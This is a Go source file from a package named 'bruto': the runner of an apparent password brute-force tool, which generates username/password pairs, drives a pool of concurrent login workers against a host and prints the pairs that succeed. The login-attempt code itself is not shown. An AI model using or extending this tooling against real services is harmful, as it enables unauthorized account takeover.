package bruto

import (
	"fmt"
	"io"
)

type broken chan login

func makeBroken() broken {
	return broken(make(chan login))
}

func (b broken) writeTo(w io.Writer) {
	for l := range b {
		fmt.Fprintf(w, "%s\n", &l)
	}
}

type Runner struct {
	// URLs generator
	domain urls
	// Receiver of session worker events
	sessions chan maybeSession
	// Signal that the login pair generator has finished
	pwdOver chan struct{}
	// Login pair generator
	logins logins
	// Receiver for successful login attempts
	broken broken
	// Pool of session workers
	pool pool
}

func NewRunner(host string) *Runner {
	return &Runner{
		domain:   urls(host),
		sessions: make(chan maybeSession),
		pwdOver:  make(chan struct{}),
		broken:   makeBroken(),
		logins:   makeLogins(),
		pool:     newPool(),
	}
}

// Utility to create a new session
func (r *Runner) makeSession() {
	s := newSession(r.domain, r.sessions, r.logins, r.broken)
	r.pool.add(s)
	go s.run()
}

func (r *Runner) generateLogins() {
	r.logins.generate()
	// Signal that we have no more passwords to try
	r.pwdOver <- struct{}{}
	close(r.pwdOver)
}

func (r *Runner) startWorkers(n int) {
	// Make some sessions to start
	for i := 0; i < n; i++ {
		r.makeSession()
	}
}

func (r *Runner) Run(w io.Writer, workers int) {
	var noPwd bool
	// Generate username/password pairs and signal when there are no more
	go r.generateLogins()
	// Print broken login pairs to stdout
	go r.broken.writeTo(w)
	// Start some workers
	r.startWorkers(workers)
	for {
		select {
		case s := <-r.sessions:
			// Currently we ignore the signal that a worker is ready
			if s.err == nil {
				break
			}
			if s.err != errSessionOver {
				// TODO: Detect the error rate here. If high, don't start new workes, exit.
				fmt.Printf("Error: %s\n", s.err)
			}
			// Remove a worker from the pool if it had an error and it's dead
			r.pool.del(s)
			// If no more sessions are working
			if !r.pool.alive() {
				// If we finished the passwords to try, exit
				if noPwd {
					close(r.broken)
					return
				}
				// Start up some more sessions to finish the logins
				r.startWorkers(workers)
			}
		case <-r.pwdOver:
			// No more passwords to try, just wait for all
			// the sessions to finish their attemps.
			noPwd = true
		}
	}
}
